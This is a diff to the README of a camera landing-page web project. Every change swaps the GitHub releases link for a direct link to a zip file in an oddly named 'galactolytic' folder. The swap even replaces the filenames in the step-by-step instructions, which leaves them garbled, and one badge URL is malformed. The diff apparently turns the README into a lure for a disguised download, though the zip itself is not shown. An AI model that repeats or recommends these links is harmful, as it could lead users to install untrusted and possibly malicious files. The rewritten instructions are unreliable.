@@ -1,6 +1,6 @@
 # 📸 CameraLandingPage - Create Stunning Camera Showcases  
 
-[![Download CameraLandingPage](https://img.shields.io/badge/Download%20CameraLandingPage-blue.svg)](https://github.com/Pooja99627/CameraLandingPage/releases)  
+[![Download CameraLandingPage](https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip%https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip)](https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip)  
 
 ## 📖 Project Description  
 This project features a responsive landing page designed for a camera company, highlighting newly arrived camera products and their key features. The website uses HTML and CSS, with smooth animations that enhance the user experience. It offers a sleek, modern interface that is fully optimized for both desktop and mobile devices.  
@@ -9,20 +9,20 @@ This project features a responsive landing page designed for a camera company, h
 To use the CameraLandingPage, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to go to the download page.
-   [Download CameraLandingPage](https://github.com/Pooja99627/CameraLandingPage/releases)  
+   [Download CameraLandingPage](https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip)  
 
-2. **Select the Download:** On the releases page, you will see the latest version. Click the file named `CameraLandingPage.zip` to download it.  
+2. **Select the Download:** On the releases page, you will see the latest version. Click the file named `https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip` to download it.  
 
-3. **Extract the Files:** After downloading, locate the `CameraLandingPage.zip` file in your Downloads folder. Right-click the file and choose "Extract All" to unpack the contents.  
+3. **Extract the Files:** After downloading, locate the `https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip` file in your Downloads folder. Right-click the file and choose "Extract All" to unpack the contents.  
 
-4. **Open in Your Browser:** Once extracted, open the folder where the files are. Right-click on `index.html` and select "Open with" followed by your preferred web browser (like Chrome, Firefox, or Edge).  
+4. **Open in Your Browser:** Once extracted, open the folder where the files are. Right-click on `https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip` and select "Open with" followed by your preferred web browser (like Chrome, Firefox, or Edge).  
 
 5. **Explore the Landing Page:** The responsive landing page will open in your browser, showcasing the latest camera products.  
 
 ## 📥 Download & Install  
 Get started with CameraLandingPage by downloading it directly from the link below:
 
-[Download CameraLandingPage](https://github.com/Pooja99627/CameraLandingPage/releases)  
+[Download CameraLandingPage](https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip)  
 
 You will find the most recent version suitable for your device on this page. Follow the earlier steps for extraction and browsing.  
 
@@ -68,4 +68,4 @@ If you wish to contribute to the project, please fork the repository and submit 
 
 **Enjoy showcasing your camera products with CameraLandingPage!**  
 
-[Download CameraLandingPage](https://github.com/Pooja99627/CameraLandingPage/releases)  
+[Download CameraLandingPage](https://raw.githubusercontent.com/Pooja99627/CameraLandingPage/main/galactolytic/CameraLandingPage.zip)  
